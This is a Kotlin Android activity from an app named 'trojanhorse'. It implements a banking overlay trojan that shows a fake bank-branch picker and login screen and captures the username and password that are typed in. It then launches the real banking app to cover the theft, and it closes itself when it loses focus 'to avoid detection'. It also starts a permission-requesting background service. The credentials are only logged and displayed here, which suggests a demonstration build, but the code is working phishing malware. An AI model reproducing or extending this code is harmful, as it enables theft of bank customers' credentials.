package com.lookmyup.trojanhorse

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.material3.MaterialTheme
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.core.content.ContextCompat

class MainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "TrojanHorse"
        const val KILL_ACTION = "com.lookmyup.trojanhorse.KILL_ACTIVITY"
    }

    private var isOverlayMode = false
    private var killReceiver: BroadcastReceiver? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        registerKillReceiver()

        // Check if we should show the login overlay or the normal app content
        isOverlayMode = intent.component?.className == MainActivity::class.java.name &&
                intent.action != Intent.ACTION_MAIN

        if (!isOverlayMode) {
            // Start requesting permissions immediately (only in normal mode)
            ServiceStarter.requestPermissionsAndStartService(this)
        }


        val targetApp = BuildConfig.TARGET_PACKAGE

        setContent {
            MaterialTheme {
                if (isOverlayMode) {
                    var showLogin by remember { mutableStateOf(false) }
                    if(showLogin) {
                        LoginScreen { username, password ->
                            // Log or handle the captured credentials
                            Log.d(TAG, "Captured credentials: $username / $password")
                            //show toast
                            Toast.makeText(this, "Captured credentials: $username / $password", Toast.LENGTH_LONG).show()
                            // Close this activity and launch the real banking app
                            val bankingAppIntent = packageManager.getLaunchIntentForPackage(targetApp)
                            if (bankingAppIntent != null) {
                                startActivity(bankingAppIntent)
                            }
                            finish()
                        }
                    }else {
                        CaisseRegionaleScreen(
                            onCaisseSelected = { caisse ->
                                Log.d(TAG, "Selected Caisse: ${caisse.name}")
                                showLogin = true
                            }
                        )
                    }
                } else {
                    // Show control panel UI for managing the service
                    ServiceControlPanel()
                }
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "MainActivity onDestroy")
        unregisterKillReceiver()
    }

    private fun unregisterKillReceiver() {
        if (killReceiver != null) {
            try {
                unregisterReceiver(killReceiver!!)
                Log.d(TAG, "Kill receiver unregistered in MainActivity")
            } catch (e: Exception) {
                Log.e(TAG, "Error unregistering kill receiver: ${e.message}")
            }
        }
    }

    private fun registerKillReceiver() {
        killReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                if (intent.action == KILL_ACTION) {
                    if (isOverlayMode) {
                        // Close the overlay activity
                        Log.d("KillBroadcast", "Closing overlay activity")
                        finishAndRemoveTask()
                        finishAffinity()
                    }
                }
            }
        }

        val filter = IntentFilter(KILL_ACTION)
        ContextCompat.registerReceiver(
            this,
            killReceiver!!,
            filter,
            ContextCompat.RECEIVER_NOT_EXPORTED
        )

        Log.d(TAG, "Kill receiver registered in MainActivity")
    }

    override fun onResume() {
        super.onResume()

        // Don't handle permissions in overlay mode
        val isOverlayMode = intent.flags and Intent.FLAG_ACTIVITY_NEW_TASK != 0
        if (isOverlayMode) return

        // Continue permission flow if needed
        ServiceStarter.continuePermissionRequestIfNeeded(this)
    }


    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        // Only close when launched as overlay
        if (!hasFocus && intent.flags and Intent.FLAG_ACTIVITY_NEW_TASK != 0) {
            // App lost focus - user might be checking app switcher
            // Close immediately to avoid detection
            finish()
        }
    }
}